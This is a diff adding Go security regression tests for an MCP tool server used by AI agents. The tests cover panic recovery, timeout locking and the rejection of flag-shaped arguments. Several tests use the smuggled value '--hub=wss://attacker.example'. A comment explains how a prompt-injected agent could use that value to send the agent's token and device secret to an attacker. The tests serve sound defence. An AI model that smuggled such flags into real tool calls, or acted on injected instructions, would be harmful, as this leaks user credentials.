@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"strings"
 	"testing"
+	"time"
 )
 
 // drive runs a batch of JSON-RPC lines through the server and returns the
@@ -230,4 +231,136 @@ func TestMCPToolOutputDoesNotCorruptTheStream(t *testing.T) {
 		t.Error("tool result still contains ANSI colour codes")
 	}
 	_ = context.Background()
+}
+
+// ── Security regressions found in review ───────────────────────────────────
+
+// A panic inside a tool must come back as a tool error, not take the process
+// (and therefore the agent's whole session) down.
+//
+// This is Go's rule, not a detail: a panic on one goroutine cannot be recovered
+// by its parent, so the recover() that used to sit in runTool could never fire
+// — it only ever saw panics on runTool's own stack. The recover has to be
+// inside the goroutine that runs the handler.
+func TestMCPToolPanicIsReportedNotFatal(t *testing.T) {
+	srv := newMCPServer("", false)
+	srv.tools["panicky"] = &mcpTool{
+		Name:    "panicky",
+		handler: func(ctx context.Context, args map[string]any) (string, error) { panic("boom from a tool") },
+	}
+	srv.order = append(srv.order, "panicky")
+
+	resps := drive(t, srv,
+		`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"panicky","arguments":{}}}`,
+		`{"jsonrpc":"2.0","id":2,"method":"ping"}`)
+	if len(resps) != 2 {
+		t.Fatalf("server did not survive the panic: %d responses", len(resps))
+	}
+	raw, _ := json.Marshal(resps[0].Result)
+	var res struct {
+		Content []struct{ Text string } `json:"content"`
+		IsError bool                    `json:"isError"`
+	}
+	json.Unmarshal(raw, &res)
+	if !res.IsError || !strings.Contains(res.Content[0].Text, "panicked") {
+		t.Errorf("expected a reported panic, got %+v", res)
+	}
+	if resps[1].Error != nil {
+		t.Errorf("ping after the panic failed: %v", resps[1].Error)
+	}
+}
+
+// An agent-supplied value that looks like a flag must be refused. A
+// prompt-injected agent supplying image_path="--hub=wss://attacker.example"
+// used to override the --hub this server was started with (pflag honours the
+// LAST occurrence), sending the agents token and the device secret elsewhere.
+func TestMCPRejectsFlagShapedPaths(t *testing.T) {
+	for _, key := range []string{"sketch_dir", "image_path", "binary"} {
+		args := map[string]any{key: "--hub=wss://attacker.example"}
+		if _, err := pathArg(args, key); err == nil {
+			t.Errorf("pathArg(%q=%q) was accepted; a leading dash must be refused",
+				key, args[key])
+		}
+	}
+	// A normal path still works, and an empty one means "not supplied".
+	if v, err := pathArg(map[string]any{"sketch_dir": "/home/me/Blink"}, "sketch_dir"); err != nil || v != "/home/me/Blink" {
+		t.Errorf("a legitimate path was rejected: %q %v", v, err)
+	}
+	if v, err := pathArg(map[string]any{}, "sketch_dir"); err != nil || v != "" {
+		t.Errorf("an absent path should yield \"\", got %q %v", v, err)
+	}
+}
+
+// Agent-supplied values must be protected by a "--" terminator so the flag
+// parser stops before them.
+func TestMCPPositionalArgsAreTerminated(t *testing.T) {
+	got := positionalArgs("--hub=wss://attacker.example")
+	if len(got) != 2 || got[0] != "--" {
+		t.Fatalf("positionalArgs did not lead with a terminator: %q", got)
+	}
+	if got[1] != "--hub=wss://attacker.example" {
+		t.Errorf("value was altered: %q", got[1])
+	}
+}
+
+// runTool must not release callMu while a timed-out handler is still running:
+// runCLI swaps the process-global os.Stdout/os.Stderr, and two calls
+// interleaving that can leave the globals pointing at a closed pipe.
+//
+// The handler here outlives the context, so the ordering is the whole point —
+// runTool must only return once the work has genuinely stopped.
+func TestMCPTimedOutToolKeepsTheLock(t *testing.T) {
+	srv := newMCPServer("", false)
+	started := make(chan struct{})
+	// Plain bool is safe here: the handler writes it before runTool's
+	// <-finished returns, which is a happens-before edge via channel close.
+	var exited bool
+
+	srv.tools["slowpoke"] = &mcpTool{
+		Name: "slowpoke",
+		handler: func(ctx context.Context, args map[string]any) (string, error) {
+			close(started)
+			// Ignores ctx cancellation on purpose: this is the case that used
+			// to let runTool return (and drop the lock) while work continued.
+			time.Sleep(250 * time.Millisecond)
+			exited = true
+			return "done", nil
+		},
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 40*time.Millisecond)
+	defer cancel()
+	resp := &mcpResponse{}
+	done := make(chan struct{})
+	begin := time.Now()
+	go func() {
+		srv.runTool(ctx, srv.tools["slowpoke"], nil, resp)
+		close(done)
+	}()
+
+	<-started
+	select {
+	case <-done:
+	case <-time.After(3 * time.Second):
+		t.Fatal("runTool never returned")
+	}
+
+	if !exited {
+		t.Error("runTool returned while the handler was still running — callMu was " +
+			"released with the os.Stdout/os.Stderr swap still in effect")
+	}
+	if elapsed := time.Since(begin); elapsed < 200*time.Millisecond {
+		t.Errorf("runTool returned after %v, so it did not wait for the "+
+			"handler that outlived its context", elapsed)
+	}
+	// And the agent still gets a usable answer, not a hang.
+	raw, _ := json.Marshal(resp.Result)
+	var res struct {
+		Content []struct{ Text string } `json:"content"`
+		IsError bool                    `json:"isError"`
+	}
+	json.Unmarshal(raw, &res)
+	if !res.IsError || !strings.Contains(res.Content[0].Text, "timed out") {
+		t.Errorf("expected a timeout error for the agent, got %+v", res)
+	}
 }
